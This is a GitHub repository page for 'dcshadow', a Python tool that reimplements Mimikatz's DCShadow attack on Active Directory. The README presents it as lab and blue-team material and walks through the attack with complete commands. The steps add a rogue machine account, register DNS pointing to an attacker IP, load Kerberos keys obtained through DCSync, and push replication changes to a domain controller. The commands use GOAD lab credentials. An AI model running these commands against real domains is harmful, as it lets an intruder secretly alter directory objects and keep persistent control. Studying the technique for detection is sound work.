# https://github.com/ShutdownRepo/dcshadow

[Skip to content](https://github.com/ShutdownRepo/dcshadow#start-of-content)

You signed in with another tab or window. [Reload](https://github.com/ShutdownRepo/dcshadow) to refresh your session.You signed out in another tab or window. [Reload](https://github.com/ShutdownRepo/dcshadow) to refresh your session.You switched accounts on another tab or window. [Reload](https://github.com/ShutdownRepo/dcshadow) to refresh your session.Dismiss alert

{{ message }}

[ShutdownRepo](https://github.com/ShutdownRepo)/ **[dcshadow](https://github.com/ShutdownRepo/dcshadow)** Public

- [Notifications](https://github.com/login?return_to=%2FShutdownRepo%2Fdcshadow) You must be signed in to change notification settings
- [Fork\\
17](https://github.com/login?return_to=%2FShutdownRepo%2Fdcshadow)
- [Star\\
157](https://github.com/login?return_to=%2FShutdownRepo%2Fdcshadow)


Python alternative to Mimikatz lsadump::dcshadow


### License

[MIT license](https://github.com/ShutdownRepo/dcshadow/blob/main/LICENSE)

[157\\
stars](https://github.com/ShutdownRepo/dcshadow/stargazers) [17\\
forks](https://github.com/ShutdownRepo/dcshadow/forks) [Branches](https://github.com/ShutdownRepo/dcshadow/branches) [Tags](https://github.com/ShutdownRepo/dcshadow/tags) [Activity](https://github.com/ShutdownRepo/dcshadow/activity)

[Star](https://github.com/login?return_to=%2FShutdownRepo%2Fdcshadow)

[Notifications](https://github.com/login?return_to=%2FShutdownRepo%2Fdcshadow) You must be signed in to change notification settings

# ShutdownRepo/dcshadow

main

[**1** Branch](https://github.com/ShutdownRepo/dcshadow/branches) [**0** Tags](https://github.com/ShutdownRepo/dcshadow/tags)

[Go to Branches page](https://github.com/ShutdownRepo/dcshadow/branches)[Go to Tags page](https://github.com/ShutdownRepo/dcshadow/tags)

Go to file

Code

Open more actions menu

## Folders and files

| Name | Name | Last commit message | Last commit date |
| --- | --- | --- | --- |
| ## Latest commit<br>[![ShutdownRepo](https://avatars.githubusercontent.com/u/40902872?v=4&size=40)](https://github.com/ShutdownRepo)[ShutdownRepo](https://github.com/ShutdownRepo/dcshadow/commits?author=ShutdownRepo)<br>[Updating README.md](https://github.com/ShutdownRepo/dcshadow/commit/c283f954d12dd85e0f520b4b1b349ff7f2ab9b15)<br>8 months agoJun 24, 2025<br>[c283f95](https://github.com/ShutdownRepo/dcshadow/commit/c283f954d12dd85e0f520b4b1b349ff7f2ab9b15) · 8 months agoJun 24, 2025<br>## History<br>[3 Commits](https://github.com/ShutdownRepo/dcshadow/commits/main/) <br>Open commit details<br>[View commit history for this file.](https://github.com/ShutdownRepo/dcshadow/commits/main/) 3 Commits |
| [dcshadow](https://github.com/ShutdownRepo/dcshadow/tree/main/dcshadow "dcshadow") | [dcshadow](https://github.com/ShutdownRepo/dcshadow/tree/main/dcshadow "dcshadow") | [First commit](https://github.com/ShutdownRepo/dcshadow/commit/7e4fae57ffdf5e74ecdc85d693a6db96d57487ab "First commit") | 8 months agoJun 24, 2025 |
| [impacket](https://github.com/ShutdownRepo/dcshadow/tree/main/impacket "impacket") | [impacket](https://github.com/ShutdownRepo/dcshadow/tree/main/impacket "impacket") | [First commit](https://github.com/ShutdownRepo/dcshadow/commit/7e4fae57ffdf5e74ecdc85d693a6db96d57487ab "First commit") | 8 months agoJun 24, 2025 |
| [.gitignore](https://github.com/ShutdownRepo/dcshadow/blob/main/.gitignore ".gitignore") | [.gitignore](https://github.com/ShutdownRepo/dcshadow/blob/main/.gitignore ".gitignore") | [First commit](https://github.com/ShutdownRepo/dcshadow/commit/7e4fae57ffdf5e74ecdc85d693a6db96d57487ab "First commit") | 8 months agoJun 24, 2025 |
| [LICENSE](https://github.com/ShutdownRepo/dcshadow/blob/main/LICENSE "LICENSE") | [LICENSE](https://github.com/ShutdownRepo/dcshadow/blob/main/LICENSE "LICENSE") | [Initial commit](https://github.com/ShutdownRepo/dcshadow/commit/4e3a152800c38267348d7ea065e6c7340f823ac8 "Initial commit") | 8 months agoJun 24, 2025 |
| [README.md](https://github.com/ShutdownRepo/dcshadow/blob/main/README.md "README.md") | [README.md](https://github.com/ShutdownRepo/dcshadow/blob/main/README.md "README.md") | [Updating README.md](https://github.com/ShutdownRepo/dcshadow/commit/c283f954d12dd85e0f520b4b1b349ff7f2ab9b15 "Updating README.md") | 8 months agoJun 24, 2025 |
| [dcshadow.py](https://github.com/ShutdownRepo/dcshadow/blob/main/dcshadow.py "dcshadow.py") | [dcshadow.py](https://github.com/ShutdownRepo/dcshadow/blob/main/dcshadow.py "dcshadow.py") | [First commit](https://github.com/ShutdownRepo/dcshadow/commit/7e4fae57ffdf5e74ecdc85d693a6db96d57487ab "First commit") | 8 months agoJun 24, 2025 |
| [requirements.txt](https://github.com/ShutdownRepo/dcshadow/blob/main/requirements.txt "requirements.txt") | [requirements.txt](https://github.com/ShutdownRepo/dcshadow/blob/main/requirements.txt "requirements.txt") | [First commit](https://github.com/ShutdownRepo/dcshadow/commit/7e4fae57ffdf5e74ecdc85d693a6db96d57487ab "First commit") | 8 months agoJun 24, 2025 |
| View all files |

## Repository files navigation

Warning

DO NOT RUN IN PRODUCTION. This is meant for lab testing, for blue teams to work on identifying IoCs, event types, and behavior.
Also, this tool is provided as-is. No support is planned apart from standard review on pull requests you may want to create.
Don't run this from a Windows host. Do it from linux, or from a VM (to avoid RPC services conflicts).

# Theory

[Permalink: Theory](https://github.com/ShutdownRepo/dcshadow#theory)

This project is meant to be a pure-python alternative to Mimikatz's dcshadow technique. This includes a custom Impacket with modified `crypto`, `gssapi` and `drsuapi` among other things.

[DCShadow](https://www.thehacker.recipes/ad/persistence/dcshadow/) is a powerful persistence technique that could be considered as a transport for other techniques such as [SID history](https://www.thehacker.recipes/ad/persistence/sid-history), [KRBTGT RBCD](https://www.thehacker.recipes/ad/persistence/kerberos/delegation-to-krbtgt), [ACE abuse](https://www.thehacker.recipes/ad/persistence/dacl), and more.

This tool could be a foundation for a more versatile AD pertistence framework, that could be used by our community to raise our global maturity on the matter.

This tool was tested on [GOAD](https://github.com/Orange-Cyberdefense/GOAD).

# Hands-on

[Permalink: Hands-on](https://github.com/ShutdownRepo/dcshadow#hands-on)

## 0\. Install

[Permalink: 0. Install](https://github.com/ShutdownRepo/dcshadow#0-install)

```
python3 -m venv venv
source ./venv/bin/activate
pip3 install -r ./requirements.txt
pip3 install ./impacket
```

## 1\. Create machine account

[Permalink: 1. Create machine account](https://github.com/ShutdownRepo/dcshadow#1-create-machine-account)

This machine will be registered as a domain controller for the duration of the replication, and will be unregistered at the end.

```
venv/bin/addcomputer.py -computer-name 'fake701$' -computer-pass '123soleil!' -method LDAPS -dc-host "kingslanding.sevenkingdoms.local" -dc-ip "192.168.10.10" -domain-netbios "sevenkingdoms" "sevenkingdoms.local"/"tyron.lannister":"Alc00L&S3x" -debug
```

Warning

adcomputer.py is modified to set `msDS-SupportedEncryptionTypes` to `0x1f`. Latest tests seem to raise a constraint violation.

```
[+] Impacket Library Installation Path: /workspace/adpersist/venv/lib/python3.11/site-packages/impacket
Traceback (most recent call last):
 File "/workspace/adpersist/venv/bin/addcomputer.py", line 248, in run_ldaps
   raise Exception(str(ldapConn.result))
Exception: {'result': 19, 'description': 'constraintViolation', 'dn': '', 'message': '0000207C: AtrErr: DSID-03153410, #1:\n\t0: 0000207C: DSID-03153410, problem 1005 (CONSTRAINT_ATT_TYPE), data 0, Att 907ab (msDS-SupportedEncryptionTypes)\n\x00', 'referrals': None, 'type': 'addResponse'}
[-] {'result': 19, 'description': 'constraintViolation', 'dn': '', 'message': '0000207C: AtrErr: DSID-03153410, #1:\n\t0: 0000207C: DSID-03153410, problem 1005 (CONSTRAINT_ATT_TYPE), data 0, Att 907ab (msDS-SupportedEncryptionTypes)\n\x00', 'referrals': None, 'type': 'addResponse'}
```

For now, use the regular addcomputer.py script from Impacket, and modify `msDS-SupportedEncryptionTypes` manually through ADSI edit.

## 2\. DNS entry for the machine

[Permalink: 2. DNS entry for the machine](https://github.com/ShutdownRepo/dcshadow#2-dns-entry-for-the-machine)

This is needed for the legit DC to know how to reach the rogue DC and avoid `ERROR_DS_DNS_LOOKUP_FAILURE` errors.

```
dnstool.py -u "sevenkingdoms.local"/"tyron.lannister" -p "Alc00L&S3x" --record 'fake701' --action add --data "$ATTACKER_IP" "kingslanding.sevenkingdoms.local"
```

Tip

If the command doesn't work for some reason, add the DNS entry manually through the DNS tools on the domain controller.

## 3\. Rogue DC credentials

[Permalink: 3. Rogue DC credentials](https://github.com/ShutdownRepo/dcshadow#3-rogue-dc-credentials)

When we started developping this tool, we were using hardcoded credentials in an .env file, loaded in the `gss_kerberos_ap_req` function in the `dcshadow/utils/server/RpcServer.py` file.

This clearly needs an upgrade. The password of the rogue DC account could be passed as CLI argument and kerberos keys calculated. Krbrelayx does that already, dacledit.py as well, it needs copy-pasting.

For now you need to export the Kerberos keys as environment variables.

It should look like this:

```
export RC4=652c1be004ef335aa218cfed8e9297fc
export AES128=710b676a1fec1c68edc44b759aace44a
export AES256=bc7564c2e7a2bc740c277ec39f8c5d81e03df8001b7d670f5b46c177242a8bbc
```

Those keys can be retrieve with through a [DCSync](https://www.thehacker.recipes/ad/movement/credentials/dumping/dcsync) attack.

## 4\. DCShadow (JSON file)

[Permalink: 4. DCShadow (JSON file)](https://github.com/ShutdownRepo/dcshadow#4-dcshadow-json-file)

```
python3 dcshadow.py --json repl.json --domain "sevenkingdoms.local" --user "cersei.lannister" --password "il0vejaime" --dc-ip "192.168.10.10" --legit-dc-fqdn "kingslanding.sevenkingdoms.local" --rogue-dc-name "fake701"
```

Tip

In this case, a `repl.json` file is used to specify the target objects and attributes. Alternatively, the tool supports inline options (e.g., `--object`, `--attribute`, and `--value`).

# Common errors

[Permalink: Common errors](https://github.com/ShutdownRepo/dcshadow#common-errors)

## DRSReplicaAdd: timed out

[Permalink: DRSReplicaAdd: timed out](https://github.com/ShutdownRepo/dcshadow#drsreplicaadd-timed-out)

If the DRSReplicaAdd times out, it probably is a networking/firewall issue on the machine running dcshadow.py (the rogue DC), that's probably not allowing incoming trafic on 135/TCP (epmapper) and 1337/TCP (or dynamic port if implemented in the future, for drsuapi)

## DRSReplicaAdd: rpc\_s\_access\_denied

[Permalink: DRSReplicaAdd: rpc_s_access_denied](https://github.com/ShutdownRepo/dcshadow#drsreplicaadd-rpc_s_access_denied)

You'd need to run Wireshark on the legit domain controller, but the most probably root cause is you're trying to run this on a Windows machine, meaning when the legit DC asks your rogue DC's epmapper for the port of the drsuapi endpoint, the answer is empty since it's your own windows machine's epmapper that's responding and not our custom one.

# Credits

[Permalink: Credits](https://github.com/ShutdownRepo/dcshadow#credits)

This project wouldn't have been possible without the immense help of [Alessandro Iandoli "MrAle98"](https://github.com/MrAle98), a talented researcher met during the development. Thank you Alessandro!

Credits go to Benjamin Delpy and Vincent Letoux for the initial discovery, talks, and implementation in Mimikatz.

I'd like to thank Volker as well, who took part in the early development.

Thanks to Dramelac for the help in going for PoC to modular project, a foundation for a future framework, if it ever goes there.

## About

Python alternative to Mimikatz lsadump::dcshadow


### Resources

[Readme](https://github.com/ShutdownRepo/dcshadow#readme-ov-file)

### License

[MIT license](https://github.com/ShutdownRepo/dcshadow#MIT-1-ov-file)

### Uh oh!

There was an error while loading. [Please reload this page](https://github.com/ShutdownRepo/dcshadow).

[Activity](https://github.com/ShutdownRepo/dcshadow/activity)

### Stars

[**157**\\
stars](https://github.com/ShutdownRepo/dcshadow/stargazers)

### Watchers

[**2**\\
watching](https://github.com/ShutdownRepo/dcshadow/watchers)

### Forks

[**17**\\
forks](https://github.com/ShutdownRepo/dcshadow/forks)

[Report repository](https://github.com/contact/report-content?content_url=https%3A%2F%2Fgithub.com%2FShutdownRepo%2Fdcshadow&report=ShutdownRepo+%28user%29)

## [Releases](https://github.com/ShutdownRepo/dcshadow/releases)

No releases published

## [Packages\  0](https://github.com/users/ShutdownRepo/packages?repo_name=dcshadow)

No packages published

## Languages

- [Python100.0%](https://github.com/ShutdownRepo/dcshadow/search?l=python)

You can’t perform that action at this time.